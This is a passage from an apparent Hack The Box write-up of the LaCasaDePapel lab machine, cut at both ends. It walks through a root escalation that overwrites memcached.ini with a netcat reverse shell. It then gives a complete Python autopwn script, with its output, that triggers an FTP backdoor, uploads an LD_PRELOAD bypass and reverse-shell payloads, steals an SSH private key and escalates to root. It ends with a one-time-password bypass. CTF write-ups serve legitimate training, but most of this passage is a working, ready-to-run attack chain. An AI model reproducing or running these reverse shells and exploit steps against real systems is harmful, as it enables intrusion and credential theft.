</span></span></span><span class="line"><span class="cl"><span class="go">| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | &#39;_ \ / _ \ |
</span></span></span><span class="line"><span class="cl"><span class="go">| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
</span></span></span><span class="line"><span class="cl"><span class="go">|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
</span></span></span><span class="line"><span class="cl"><span class="go">                                                            |_|       
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">lacasadepapel [~]$ 
</span></span></span></code></pre></div></div>

<h1 id="getting-root-by-exploiting-memcached">Getting root by exploiting memcached</h1>

<p>Let&rsquo;s list the files in professor&rsquo;s home directory:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">lacasadepapel [~]$ ls -al
</span></span></span><span class="line"><span class="cl"><span class="go">total 24
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
</span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -&gt; /dev/null
</span></span></span><span class="line"><span class="cl"><span class="go">drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
</span></span></span><span class="line"><span class="cl"><span class="go">-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
</span></span></span></code></pre></div></div></p>

<p>Those memcached files seem very interesting. Let&rsquo;s explore more:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">lacasadepapel [~]$ cat memcached.ini
</span></span></span><span class="line"><span class="cl"><span class="go">[program:memcached]
</span></span></span><span class="line"><span class="cl"><span class="go">command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">cat memcached.js
</span></span></span><span class="line"><span class="cl"><span class="go">cat: can&#39;t open &#39;memcached.js&#39;: Permission denied
</span></span></span></code></pre></div></div></p>

<p>It seems like inside memcached.ini there is a setting for a command to be executed. But we don&rsquo;t have permission to write/edit this file. Well, we don&rsquo;t really need it! We can delete/move the file and write a new one in its place. You see, to delete a file in Unix, all we need is write permission for the direct parent directory (i.e. professor&rsquo;s home folder) and execute permission for all parent directories.
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">lacasadepapel [~]$ ls -ld /home/professor
</span></span></span><span class="line"><span class="cl"><span class="go">ls -ld /home/professor
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 /home/professor
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">lacasadepapel [~]$ ls -ld /home
</span></span></span><span class="line"><span class="cl"><span class="go">drwxr-xr-x    7 root     root          4096 Feb 16 18:06 /home
</span></span></span></code></pre></div></div></p>

<p>Let&rsquo;s get our shell:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">lacasadepapel [~]$ mv -f /home/professor/memcached.ini /home/professor/memcached.ini.orig
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">lacasadepapel [~]$ printf &#39;[program:memcached]\ncommand = sudo -u root /usr/bin/nc LHOST 60002 -e /bin/sh\n&#39; &gt; /home/professor/memcached.ini
</span></span></span></code></pre></div></div></p>

<p>Don&rsquo;t forget to setup the listerener on your side:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc -lvp <span class="m">60002</span>
</span></span><span class="line"><span class="cl"><span class="go">Listening on [0.0.0.0] (family 0, port 60002)
</span></span></span><span class="line"><span class="cl"><span class="go">Connection from lacasadepapel.htb 46245 received!
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> whoami
</span></span><span class="line"><span class="cl"><span class="go">root
</span></span></span></code></pre></div></div></p>

<p>Here is my <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/LaCasaDePapel/autopwn_lacasadepapel.py" target="_blank">autopwn script</a> (you need also <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/LaCasaDePapel/hook64.so?raw=true" target="_blank">hook64.so</a>):
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">fcntl</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
</span></span><span class="line"><span class="cl">        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s2">&#34;tun0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT1</span> <span class="o">=</span> <span class="mi">60000</span>
</span></span><span class="line"><span class="cl"><span class="n">LPORT2</span> <span class="o">=</span> <span class="mi">60001</span>
</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.131&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">6200</span>
</span></span><span class="line"><span class="cl"><span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
</span></span><span class="line"><span class="cl"><span class="n">BUF_SIZE</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl"><span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">60</span>
</span></span><span class="line"><span class="cl"><span class="n">SSH_BIN_LOCAL_PATH</span> <span class="o">=</span> <span class="s2">&#34;/usr/bin/ssh&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">CHANKRO_HOOK64_FILE</span> <span class="o">=</span> <span class="s2">&#34;hook64.so&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">REMOTE_PATH</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">REV_SHELL</span> <span class="o">=</span> <span class="s2">&#34;/usr/bin/nc &#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; -e /bin/sh&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#This works too: REV_SHELL = &#34;#!/bin/bash\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &#34; + LHOST + &#34; &#34; + str(LPORT1) + &#34; &gt;/tmp/f&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;What shell do you want?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[1] dali@lacasadepapel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[2] professor@lacasadepapel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[3] root@lacasadepapel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[4] Exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">response</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&#34;Please enter a number 1-4: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Attempting to trigger backdoor ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ftp_conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">FTP_PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Attempt to login to trigger backdoor</span>
</span></span><span class="line"><span class="cl">    <span class="n">ftp_conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;USER letmein:)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ftp_conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;PASS please&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Triggered backdoor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Failed to trigger backdoor.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Failed to connect to &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Justin Hileman&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading chankro.so ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;$myfile = fopen(&#39;&#34;</span> <span class="o">+</span> <span class="n">REMOTE_PATH</span> <span class="o">+</span> <span class="s2">&#34;chankro.so&#39;, &#39;w&#39;);&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">CHANKRO_HOOK64_FILE</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">BUF_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">          <span class="k">break</span>
</span></span><span class="line"><span class="cl">      <span class="n">b64data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;fwrite($myfile, base64_decode(&#39;&#34;</span> <span class="o">+</span> <span class="n">b64data</span> <span class="o">+</span> <span class="s2">&#34;&#39;));&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;fclose($myfile);&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading shell payload ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;file_put_contents(&#39;&#34;</span> <span class="o">+</span> <span class="n">REMOTE_PATH</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">           <span class="s2">&#34;acpid.socket&#39;, base64_decode(&#39;&#34;</span> <span class="o">+</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">REV_SHELL</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;));&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Bypassing PHP restrictions ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;putenv(&#39;CHANKRO=&#34;</span>  <span class="o">+</span> <span class="n">REMOTE_PATH</span> <span class="o">+</span> <span class="s2">&#34;acpid.socket&#39;);&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;putenv(&#39;LD_PRELOAD=&#34;</span>  <span class="o">+</span> <span class="n">REMOTE_PATH</span> <span class="o">+</span> <span class="s2">&#34;chankro.so&#39;);&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;mail(&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;);&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dali_shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">dali_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">dali_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Getting berlin&#39;s private key ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dali_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;curl -s http://127.0.0.1:8000/file/Li4vLnNzaC9pZF9yc2E=&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dali_shell</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">id_rsa_data</span> <span class="o">=</span> <span class="n">dali_shell</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;-----END OPENSSH PRIVATE KEY-----&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">id_rsa_key</span> <span class="o">=</span> <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----&#34;</span> <span class="o">+</span> <span class="n">id_rsa_data</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;berlin_id_rsa&#34;</span><span class="p">,</span> <span class="s2">&#34;wt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">id_rsa_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s2">&#34;berlin_id_rsa&#34;</span><span class="p">,</span> <span class="mo">0o600</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Login via SSH as professor ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We use an ssh process to connect because pwntools ssh tube uses the paramiko module (which is incompatible with our private key format).</span>
</span></span><span class="line"><span class="cl"><span class="n">professor_shell</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">SSH_BIN_LOCAL_PATH</span><span class="p">,</span> <span class="s2">&#34;-tt&#34;</span><span class="p">,</span> <span class="s2">&#34;-i&#34;</span><span class="p">,</span> <span class="s2">&#34;berlin_id_rsa&#34;</span><span class="p">,</span> <span class="s2">&#34;professor@&#34;</span><span class="o">+</span><span class="n">RHOST</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">professor_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">professor_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Escalating to root via memcached.ini ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">professor_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;mv -f /home/professor/memcached.ini /home/professor/memcached.ini.orig&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">professor_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;printf &#39;[program:memcached]</span><span class="se">\n</span><span class="s2">command = sudo -u root /usr/bin/nc &#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; -e /bin/sh</span><span class="se">\n</span><span class="s2">&#39; &gt; /home/professor/memcached.ini&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">root_shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">root_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">root_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">$ ./autopwn_lacasadepapel.py 
</span></span></span><span class="line"><span class="cl"><span class="s1">What shell do you want?
</span></span></span><span class="line"><span class="cl"><span class="s1">[1] dali@lacasadepapel
</span></span></span><span class="line"><span class="cl"><span class="s1">[2] professor@lacasadepapel
</span></span></span><span class="line"><span class="cl"><span class="s1">[3] root@lacasadepapel
</span></span></span><span class="line"><span class="cl"><span class="s1">[4] Exit
</span></span></span><span class="line"><span class="cl"><span class="s1">Please enter a number 1-4: 3
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Attempting to trigger backdoor ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Opening connection to 10.10.10.131 on port 21: Done
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Triggered backdoor
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Opening connection to 10.10.10.131 on port 6200: Done
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Uploading chankro.so ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Uploading shell payload ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Bypassing PHP restrictions ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Trying to bind to 0.0.0.0 on port 60000: Done
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.131 on port 38127
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Getting berlin&#39;s private key ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Login via SSH as professor ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Starting local process &#39;/usr/bin/ssh&#39;: pid 17044
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Escalating to root via memcached.ini ...
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Trying to bind to 0.0.0.0 on port 60001: Done
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.131 on port 41479
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Switching to interactive mode
</span></span></span><span class="line"><span class="cl"><span class="s1">root
</span></span></span><span class="line"><span class="cl"><span class="s1">$  
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span></span></span></code></pre></div></p>

<h1 id="alternative-long-path-gettings-berlin-s-key-via-the-web">Alternative long path: Gettings berlin&rsquo;s key via the web</h1>

<p>If we visit <a href="http://10.10.10.131/" target="_blank">http://10.10.10.131/</a> we are presented with an one-time password challenge (google authenticator). You don&rsquo;t have to scan the QR code. Just view the source code:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">view-source:http://10.10.10.131/
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">&lt;form method=&#34;POST&#34;&gt;&lt;input type=&#34;image&#34; src=&#34;/qrcode?qrurl=otpauth%3A%2F%2Fhotp%2FToken%3Fsecret%3DO5IXUTDLJBPEMZDDJ54HUNTVERPHSWTB%26algorithm%3DSHA1&#34; readonly=&#34;readonly&#34; onclick=&#34;return false&#34;&gt;&lt;input name=&#34;secret&#34; type=&#34;hidden&#34; value=&#34;O5IXUTDLJBPEMZDDJ54HUNTVERPHSWTB&#34;&gt;&lt;input name=&#34;token&#34; type=&#34;text&#34; placeholder=&#34;ONE PASSWORD&#34; autocomplete=&#34;off&#34;&gt;
</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>

<p>The value=&ldquo;O5IXUTDLJBPEMZDDJ54HUNTVERPHSWTB&rdquo; is the secret (it changes every time). We can use Python to get the 6-digit password:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">pyotp</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">hotp</span> <span class="o">=</span> <span class="n">pyotp</span><span class="o">.</span><span class="n">HOTP</span><span class="p">(</span><span class="s2">&#34;O5IXUTDLJBPEMZDDJ54HUNTVERPHSWTB&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">password</span> <span class="o">=</span> <span class="n">hotp</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">399636</span></span></span></code></pre></div></p>

<p>Upon successful login we see a message &ldquo;TO CONTINUE please check your inbox&rdquo;.</p>

<p>We can enumerate the box a little using the initial php shell. For example, to list the contents of a folder:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="err">$</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">v</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.131</span> <span class="mi">6200</span>
